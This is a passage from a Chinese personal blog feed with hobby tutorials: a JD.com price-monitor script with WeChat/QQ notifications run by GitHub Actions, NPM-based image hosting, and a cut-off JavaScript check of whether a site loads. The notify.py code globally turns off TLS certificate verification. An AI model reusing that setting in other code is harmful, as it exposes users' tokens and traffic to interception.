class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) 